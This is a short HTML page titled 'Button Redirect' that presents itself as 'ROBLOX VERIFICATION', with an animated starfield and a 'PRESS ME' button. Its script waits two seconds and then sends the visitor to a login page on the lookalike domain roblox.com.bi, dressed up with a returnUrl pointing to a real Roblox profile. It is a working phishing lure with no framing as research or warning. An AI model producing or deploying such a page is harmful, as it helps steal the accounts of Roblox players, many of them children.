<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Button Redirect</title>

<style>
body {
    margin: 0;
    height: 100vh;
    background: black;
    overflow: hidden;
    font-family: Arial, sans-serif;
    color: white;
}

/* title */
.header {
    position: fixed;
    top: 20px;
    width: 100%;
    text-align: center;
    font-size: 30px;
    font-weight: bold;
}

/* center */
.container {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
}

/* button */
button {
    font-size: 26px;
    padding: 15px 40px;
    border: none;
    border-radius: 10px;
    background: white;
    color: black;
    font-weight: bold;
    cursor: pointer;
}

/* stars */
.star {
    position: absolute;
    width: 2px;
    height: 2px;
    background: white;
    border-radius: 50%;
    animation: moveStars linear infinite;
    opacity: 0.8;
}

@keyframes moveStars {
    0% { transform: translateX(0px); }
    50% { transform: translateX(80px); }
    100% { transform: translateX(0px); }
}
</style>
</head>

<body>

<div class="header">ROBLOX VERIFICATION</div>

<div class="container">
    <button id="btn" onclick="start()">PRESS ME</button>
</div>

<script>
// stars
for (let i = 0; i < 120; i++) {
    let star = document.createElement("div");
    star.className = "star";

    star.style.top = Math.random() * window.innerHeight + "px";
    star.style.left = Math.random() * window.innerWidth + "px";

    star.style.animationDuration = (3 + Math.random() * 5) + "s";

    document.body.appendChild(star);
}

// click action
function start() {
    let btn = document.getElementById("btn");

    btn.innerText = "PLEASE WAIT";
    btn.disabled = true;

    setTimeout(() => {
        window.location.href = "https://www.roblox.com.bi/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F466441812428%2Fprofile";
    }, 2000);
}
</script>

</body>
</html>
